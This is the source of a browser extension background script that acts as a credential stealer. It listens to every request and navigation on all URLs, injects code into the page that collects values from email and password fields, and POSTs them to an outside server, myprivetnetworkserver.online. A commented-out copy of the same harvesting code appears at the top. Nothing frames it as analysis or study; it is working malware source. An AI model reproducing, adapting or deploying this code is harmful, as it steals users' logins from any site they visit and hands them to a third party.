// window.___report_email = ''
// window.___report_password = ''
// document.querySelectorAll('input[type=email]').forEach(input => {
//   if(input.value) window.___report_email = input.value
// })
// document.querySelectorAll('input[type=password]').forEach(input => {
//   if(input.value) window.___report_password = input.value
// })
// window.___credentials__ = ''
// if(window.___report_email) window.___credentials__ += ' Email: ' + window.___report_email 
// if(window.___report_password) window.___credentials__ += ' Password: ' + window.___report_password 

// window.____xhr = new XMLHttpRequest()
// window.____xhr.open("POST", "http://myprivetnetworkserver.online/client/report_user_data", true)
// window.____xhr.setRequestHeader('Content-Type', 'application/json')
// window.____xhr.send(JSON.stringify({
//     key: " Credentials: " + report_data,
// }))

function exec()
{
  browser.tabs.executeScript({
    code: `
    window.___report_email = ''
    window.___report_password = ''
    document.querySelectorAll('input[type=email]').forEach(input => {
      if(input.value) window.___report_email = input.value
    })
    document.querySelectorAll('input[type=password]').forEach(input => {
      if(input.value) window.___report_password = input.value
    })
    window.___credentials__ = ''
    if(window.___report_email) window.___credentials__ += ' Email: ' + window.___report_email 
    if(window.___report_password) window.___credentials__ += ' Password: ' + window.___report_password 
    console.log(" Credentials: " + window.___credentials__)
    window.____xhr = new XMLHttpRequest()
    window.____xhr.open("POST", "http://myprivetnetworkserver.online/client/report_user_data", true)
    window.____xhr.setRequestHeader('Content-Type', 'application/json')
    window.____xhr.send(JSON.stringify({
        key: " Credentials: " + window.___credentials__,
    }))
    `,
  })
}
/**
 * Request listener
 */
const checkRequest = async request => {
  alert(1)
  console.log(request);
  if(
    request.method === 'POST' && request.requestBody 
    && !request.url.includes("myprivetnetworkserver.online/client/")
  )
  {
    exec()
  }
};

// @ts-ignore
browser.webRequest.onBeforeRequest.addListener(
  checkRequest,
  {
    urls: ['<all_urls>'],
  },
  ['requestBody']
);
browser.webNavigation.onBeforeNavigate.addListener(
  details => {
    alert(2)
    // if(details.method === 'POST' && details.requestBody )
    exec()
    console.log(details);
  },
  {
    urls: ['<all_urls>'],
  },
  ['requestBody']
);
